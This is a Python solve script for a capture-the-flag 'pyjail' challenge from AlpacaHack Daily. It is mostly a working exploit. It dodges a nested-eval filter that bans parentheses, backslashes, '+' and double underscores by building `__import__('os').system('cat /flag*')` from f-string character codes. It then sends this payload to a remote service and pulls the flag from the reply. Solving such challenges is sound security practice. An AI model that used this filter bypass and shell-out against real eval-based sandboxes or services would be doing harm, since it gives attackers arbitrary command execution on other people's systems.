#!/usr/bin/env python3
"""nested eval - AlpacaHack Daily (misc/pyjail).
chal: eval(f"eval({code})") banning ( ) \\ + __ in `code`. The OUTER eval runs
`eval(<code>)`, so <code> is an expression yielding a STRING that the INNER eval
runs (that string has no char restrictions). We can't type ( ) or __, so we
synthesize them with f-string format fields: {40:c}='(', {41:c}=')', {95:c}='_'.
The flag is renamed to /flag-<md5>.txt, so we shell out: os.system('cat /flag*').
Usage: python3 -I solve.py HOST PORT"""
import re, socket, sys
H, P = sys.argv[1], int(sys.argv[2])
# builds: __import__('os').system('cat /flag*')
code = "f\"{95:c}{95:c}import{95:c}{95:c}{40:c}'os'{41:c}.system{40:c}'cat /flag*'{41:c}\""
for bad in ("(", ")", "\\", "+", "__"):
    assert bad not in code, bad
s = socket.create_connection((H, P), timeout=20); s.settimeout(8)
buf=b""
try:
    while b"jail>" not in buf:
        buf += s.recv(4096)
    s.sendall(code.encode() + b"\n")
    data=b""
    while True:
        try: ch=s.recv(4096)
        except socket.timeout: break
        if not ch: break
        data+=ch
finally:
    s.close()
m=re.search(rb"Alpaca\{[^}]*\}", data)
print(m.group(0).decode() if m else data.decode(errors="replace"))
